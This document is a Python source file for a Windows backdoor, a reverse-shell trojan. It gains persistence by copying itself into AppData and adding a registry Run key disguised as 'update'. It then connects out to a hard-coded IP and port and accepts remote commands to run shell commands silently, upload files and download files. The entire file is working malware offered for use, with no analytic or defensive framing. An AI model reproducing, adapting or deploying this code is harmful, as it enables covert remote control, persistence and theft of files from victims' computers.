#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys
import shutil


class Backdoor:
    def __init__(self, ip, port):
        self.become_persistant()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistant(self):
        location = os.environ["appdata"] + "\\Data.exe"
        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"', shell = True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)

            except ValueError:
                continue

    def change_work_dir(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr = DEVNULL, stdin= DEVNULL)

    def read_file(self, path):
        with open(path, "rb") as r_file:
            return base64.b64encode(r_file.read())

    def write_file(self, path, content):
        with open(path, "wb") as w_file:
            w_file.write(base64.b64decode(content))
            return "[+] Upload Successful"

    def run(self):
        # connection.send("[+] I'am in")

        while True:
            command = self.reliable_recv()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()

                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_work_dir(command[1])

                elif command[0] == "download":
                    command_result = self.read_file(command[1])

                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])

                else:
                    command_result = self.execute_system_command(command)

            except Exception:
                command_result = "[-] Error during Execution"

            self.reliable_send(command_result)

try:
    my_backdoor = Backdoor("192.168.43.16", 4444)
    my_backdoor.run()

except Exception:
    sys.exit()






